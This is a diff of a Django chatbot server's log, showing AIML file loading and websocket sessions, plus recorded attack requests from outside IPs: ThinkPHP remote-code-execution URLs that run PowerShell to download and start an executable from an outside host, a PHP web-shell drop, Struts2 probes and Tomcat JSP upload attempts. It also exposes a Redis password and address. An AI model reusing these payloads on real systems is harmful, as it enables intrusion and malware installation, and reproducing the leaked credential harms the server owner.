@@ -1,26 +1,8 @@
-2019-03-17 07:54:48,654 INFO     Starting server at tcp:port=8001:interface=0.0.0.0
-2019-03-17 07:54:48,655 INFO     HTTP/2 support not enabled (install the http2 and tls Twisted extras)
-2019-03-17 07:54:48,655 INFO     Configuring endpoint tcp:port=8001:interface=0.0.0.0
-2019-03-17 07:54:48,656 INFO     Listening on TCP address 0.0.0.0:8001
-2019-03-17 09:12:03,079 INFO     Killed 2 pending application instances
-112.10.182.10:2968 - - [17/Mar/2019:07:54:58] "WSCONNECTING /ws/chat/1/" - -
-112.10.182.10:2968 - - [17/Mar/2019:07:54:58] "WSCONNECT /ws/chat/1/" - -
-Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.01 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.01 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.00 seconds)
+
+2019-03-21 00:03:25,595 WARNING  Not Found: /public/index.php
+2019-03-21 00:03:25,598 WARNING  Not Found: /public/index.php
+2019-03-21 00:03:25,601 WARNING  Not Found: /public/hydra.php
+done (0.00 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.01 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
@@ -29,124 +11,10 @@ Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.01 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
-112.10.182.10:3013 - - [17/Mar/2019:07:55:46] "WSCONNECTING /ws/chat/-1/" - -
-112.10.182.10:3013 - - [17/Mar/2019:07:55:46] "WSCONNECT /ws/chat/-1/" - -
-Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.01 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.01 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.01 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.01 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
-112.10.182.10:3013 - - [17/Mar/2019:07:56:01] "WSDISCONNECT /ws/chat/-1/" - -
-112.10.182.10:3036 - - [17/Mar/2019:07:56:11] "WSCONNECTING /ws/chat/2/" - -
-112.10.182.10:3036 - - [17/Mar/2019:07:56:11] "WSCONNECT /ws/chat/2/" - -
-Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.01 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.01 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.01 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.01 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.01 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.01 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.01 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.01 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.01 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
-112.10.182.10:2968 - - [17/Mar/2019:09:12:03] "WSDISCONNECT /ws/chat/1/" - -
-112.10.182.10:3036 - - [17/Mar/2019:09:12:03] "WSDISCONNECT /ws/chat/2/" - -
-2019-03-17 09:12:07,731 INFO     Starting server at tcp:port=8001:interface=0.0.0.0
-2019-03-17 09:12:07,732 INFO     HTTP/2 support not enabled (install the http2 and tls Twisted extras)
-2019-03-17 09:12:07,732 INFO     Configuring endpoint tcp:port=8001:interface=0.0.0.0
-2019-03-17 09:12:07,733 INFO     Listening on TCP address 0.0.0.0:8001
-2019-03-17 09:17:43,679 INFO     Killed 0 pending application instances
-2019-03-17 09:17:52,601 INFO     Starting server at tcp:port=8001:interface=0.0.0.0
-2019-03-17 09:17:52,602 INFO     HTTP/2 support not enabled (install the http2 and tls Twisted extras)
-2019-03-17 09:17:52,602 INFO     Configuring endpoint tcp:port=8001:interface=0.0.0.0
-2019-03-17 09:17:52,603 INFO     Listening on TCP address 0.0.0.0:8001
-2019-03-17 09:49:53,071 INFO     Killed 0 pending application instances
-2019-03-17 09:49:54,209 INFO     Starting server at tcp:port=8001:interface=0.0.0.0
-2019-03-17 09:49:54,210 INFO     HTTP/2 support not enabled (install the http2 and tls Twisted extras)
-2019-03-17 09:49:54,210 INFO     Configuring endpoint tcp:port=8001:interface=0.0.0.0
-2019-03-17 09:49:54,211 INFO     Listening on TCP address 0.0.0.0:8001
-2019-03-17 09:51:49,616 INFO     Killed 0 pending application instances
-2019-03-17 09:51:53,002 INFO     Starting server at tcp:port=8001:interface=0.0.0.0
-2019-03-17 09:51:53,003 INFO     HTTP/2 support not enabled (install the http2 and tls Twisted extras)
-2019-03-17 09:51:53,003 INFO     Configuring endpoint tcp:port=8001:interface=0.0.0.0
-2019-03-17 09:51:53,004 INFO     Listening on TCP address 0.0.0.0:8001
-2019-03-17 09:54:21,694 INFO     Killed 0 pending application instances
-2019-03-17 09:54:25,280 INFO     Starting server at tcp:port=8001:interface=0.0.0.0
-2019-03-17 09:54:25,280 INFO     HTTP/2 support not enabled (install the http2 and tls Twisted extras)
-2019-03-17 09:54:25,280 INFO     Configuring endpoint tcp:port=8001:interface=0.0.0.0
-2019-03-17 09:54:25,281 INFO     Listening on TCP address 0.0.0.0:8001
-2019-03-17 09:56:21,391 INFO     Killed 1 pending application instances
-112.10.182.10:2479 - - [17/Mar/2019:09:55:27] "WSCONNECTING /ws/chat/-1/" - -
-112.10.182.10:2479 - - [17/Mar/2019:09:55:27] "WSCONNECT /ws/chat/-1/" - -
-Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.01 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.01 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+112.10.183.236:3320 - - [18/Mar/2019:02:51:06] "WSDISCONNECT /ws/chat/981260.6850815089907913/" - -
+112.10.183.236:3709 - - [18/Mar/2019:02:57:42] "WSCONNECTING /ws/chat/1/" - -
+RedisChannelLayer(hosts=[{'address': 'redis://:wxy123456@39.108.111.94:6379'}])
+112.10.183.236:3709 - - [18/Mar/2019:02:57:42] "WSCONNECT /ws/chat/1/" - -
 Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.01 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
@@ -156,11 +24,49 @@ Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
-112.10.182.10:2479 - - [17/Mar/2019:09:56:21] "WSDISCONNECT /ws/chat/-1/" - -
-2019-03-17 09:56:25,057 INFO     Starting server at tcp:port=8001:interface=0.0.0.0
-2019-03-17 09:56:25,058 INFO     HTTP/2 support not enabled (install the http2 and tls Twisted extras)
-2019-03-17 09:56:25,058 INFO     Configuring endpoint tcp:port=8001:interface=0.0.0.0
-2019-03-17 09:56:25,059 INFO     Listening on TCP address 0.0.0.0:8001
+112.10.183.236:3709 - - [18/Mar/2019:04:41:01] "WSDISCONNECT /ws/chat/1/" - -
+119.29.102.136:51298 - - [18/Mar/2019:14:00:52] "GET /public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/ngdenxtstbceouc8552.exe');start%20C:/Windows/temp/ngdenxtstbceouc8552.exe" 404 1121
+119.29.102.136:51298 - - [18/Mar/2019:14:00:53] "GET /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^<?php%20$action%20=%20$_GET['xcmd'];system($action);?^>>hydra.php" 404 1121
+119.29.102.136:51298 - - [18/Mar/2019:14:00:53] "GET /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/ngdenxtstbceouc8552.exe');start%20C:/Windows/temp/ngdenxtstbceouc8552.exe" 404 1121
+139.162.79.87:41822 - - [18/Mar/2019:15:46:17] "GET /" 200 11772
+119.29.57.86:30979 - - [18/Mar/2019:17:09:17] "GET /public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/oehbbgpcrceruju28167.exe');start%20C:/Windows/temp/oehbbgpcrceruju28167.exe" 404 1121
+119.29.57.86:30979 - - [18/Mar/2019:17:09:17] "GET /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^<?php%20$action%20=%20$_GET['xcmd'];system($action);?^>>hydra.php" 404 1121
+119.29.57.86:30979 - - [18/Mar/2019:17:09:17] "GET /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/oehbbgpcrceruju28167.exe');start%20C:/Windows/temp/oehbbgpcrceruju28167.exe" 404 1121
+119.29.57.86:29027 - - [19/Mar/2019:00:43:21] "GET /public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/oehbbgpcrceruju28167.exe');start%20C:/Windows/temp/oehbbgpcrceruju28167.exe" 404 1121
+119.29.57.86:29027 - - [19/Mar/2019:00:43:21] "GET /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^<?php%20$action%20=%20$_GET['xcmd'];system($action);?^>>hydra.php" 404 1121
+119.29.57.86:29027 - - [19/Mar/2019:00:43:21] "GET /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/oehbbgpcrceruju28167.exe');start%20C:/Windows/temp/oehbbgpcrceruju28167.exe" 404 1121
+119.29.57.86:50042 - - [19/Mar/2019:01:51:43] "GET /struts2-rest-showcase/orders.xhtml" 404 1121
+119.29.57.86:50042 - - [19/Mar/2019:01:51:43] "GET /index.action" 404 1121
+119.29.57.86:50042 - - [19/Mar/2019:01:51:43] "GET /index.do" 404 1121
+119.29.57.86:6916 - - [19/Mar/2019:03:13:55] "GET /struts2-rest-showcase/orders.xhtml" 404 1121
+119.29.57.86:6916 - - [19/Mar/2019:03:13:55] "GET /index.action" 404 1121
+119.29.57.86:6916 - - [19/Mar/2019:03:13:55] "GET /index.do" 404 1121
+119.29.57.86:64618 - - [19/Mar/2019:16:28:56] "GET /struts2-rest-showcase/orders.xhtml" 404 1121
+119.29.57.86:64618 - - [19/Mar/2019:16:28:56] "GET /index.action" 404 1121
+119.29.57.86:64618 - - [19/Mar/2019:16:28:56] "GET /index.do" 404 1121
+119.29.203.241:54148 - - [19/Mar/2019:19:38:56] "PUT /FxCodeShell.jsp%20" 404 1121
+119.29.203.241:54148 - - [19/Mar/2019:19:38:56] "PUT /FxCodeShell.jsp::$DATA" 404 1121
+119.29.203.241:54148 - - [19/Mar/2019:19:38:56] "PUT /FxCodeShell.jsp/" 404 1121
+119.29.203.241:54148 - - [19/Mar/2019:19:38:56] "GET /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe" 404 1121
+117.132.155.4:55776 - - [20/Mar/2019:11:12:17] "PUT /FxCodeShell.jsp%20" 404 1121
+117.132.155.4:55776 - - [20/Mar/2019:11:12:17] "PUT /FxCodeShell.jsp::$DATA" 404 1121
+117.132.155.4:55776 - - [20/Mar/2019:11:12:17] "PUT /FxCodeShell.jsp/" 404 1121
+117.132.155.4:55776 - - [20/Mar/2019:11:12:17] "GET /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe" 404 1121
+119.29.57.86:26853 - - [21/Mar/2019:00:03:25] "GET /public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/oehbbgpcrceruju28167.exe');start%20C:/Windows/temp/oehbbgpcrceruju28167.exe" 404 1121
+119.29.57.86:26853 - - [21/Mar/2019:00:03:25] "GET /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^<?php%20$action%20=%20$_GET['xcmd'];system($action);?^>>hydra.php" 404 1121
+119.29.57.86:26853 - - [21/Mar/2019:00:03:25] "GET /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/oehbbgpcrceruju28167.exe');start%20C:/Windows/temp/oehbbgpcrceruju28167.exe" 404 1121
